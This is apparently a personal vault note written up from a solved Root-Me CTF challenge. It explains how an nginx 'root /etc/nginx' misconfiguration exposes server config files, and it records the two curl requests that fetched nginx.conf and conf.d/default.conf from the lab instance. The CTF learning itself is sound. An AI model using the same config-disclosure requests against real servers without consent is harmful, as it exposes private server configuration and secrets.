---
created: 2026-08-14
up:
  - "[[Efforts]]"
related:
  - "[[Root-Me Nginx - Alias Misconfiguration]]"
  - "[[Root-Me HTTP - Improper redirect]]"
  - "[[Root-Me API Broken Access (IDOR)]]"
  - "[[Nginx Root Location Misconfiguration (Config Exposure)]]"
in:
  - "[[Efforts]]"
tags:
  - root-me
  - nginx
  - root
  - misconfiguration
  - web-security
  - ctf
---

# Root-Me Nginx - Root Location Misconfiguration

Challenge: [Nginx - Root Location Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Root-Location-Misconfiguration) — Root-Me Web/Server challenge, instance: `http://challenge01.root-me.org:59093/`, topic: nginx `root` directive pointed at `/etc/nginx` → config exposure.

> [!Milestone]+ Status: solved
> Solved with `curl` — server-level `root /etc/nginx;` serves the config directory as web root.

## What is known

- **Profile:** 15 pts, Web - Server, Easy, author .Yo0x (Sep 2024).
- **Instance:** `http://challenge01.root-me.org:59093/`.
- **Topic:** `root /etc/nginx;` maps every request URI onto the nginx config directory — `nginx.conf`, `conf.d/*` are served as static files.
- **Flag:** captured at solve; value kept out of the vault (don't copy flags).

> [!Box]- Given config
> ```nginx
> server {
>     listen       80;
>     server_name  _;
>     root /etc/nginx;
>
>     location = / {
>         return 302 /login/login.html;
>     }
>
>     location /login/ {
>         alias /usr/share/nginx/html/login/;
>     }
>
>     location /static/ {
>         alias /var/www/app/static/;
>     }
>
>     location / {
>         try_files $uri $uri/ =404;
>         default_type text/plain;
>     }
>
>     error_page 404 =200 /error.txt;
>
>     location /error.txt {
>         internal;
>     }
> }
> ```

> [!NOTE]- Access: Anubis anti-bot
> Challenge pages are served behind Anubis — use a real browser session or hit the challenge instance directly.

## How it was solved

1. **Recon:** `curl -L http://challenge01.root-me.org:59093/nginx.conf` → returns the live config, revealing `include /etc/nginx/conf.d/default.conf;`.
2. **Attack:** `curl -L http://challenge01.root-me.org:59093/conf.d/default.conf` → flag (root location serves files from `/etc/nginx`; the `conf.d` subdirectory is reachable).

## Post-solve pipeline

> [!COMMAND]- Learnings → vault Knowledge Pipeline (no custom tooling)
> 1. **Encounter Gate** — `skill://grill-me`: raw spark? → capture to `+/`; to promote, skip gate (`.omp/RULES.md` Steps 0–0b).
> 2. **Classify** knowledge type (Concept/Process/Entity/Principle) — `.omp/knowledge/knowledge-classification.md`.
> 3. **Distill → locate → link** — @sensemaker (atomic notes, own words) → @librarian (location) → @connector (`up:`/`related:`, duplicates, `needs-moc`). Destination `Atlas/` (`.omp/RULES.md` Steps 1–4). Logged via `bash .omp/scripts/knowledge-pipeline.sh`. Research: Open Notebook.
> 4. **Confidence** — ≥0.85 auto-run; 0.70–0.84 confirm; <0.70 options per step (`.omp/knowledge/workflows.md`). Fallbacks: @librarian fails → `+/`; @connector fails → linkless + flag.
> 5. **Frontmatter + validation** — `standards.md`, `output-standards.md`, Validation Checklist (`.omp/knowledge/workflows.md`).
> 6. **MOC Gate** — `skill://grill-me` + `skill://moc-workbench`; `scripts/validate_moc.py` (`.omp/RULES.md` Step 5; squeeze-point rule).

Never ingest challenge tokens/keys into notes — `.omp/RULES.md` Sensitive Data Protection (FATAL).
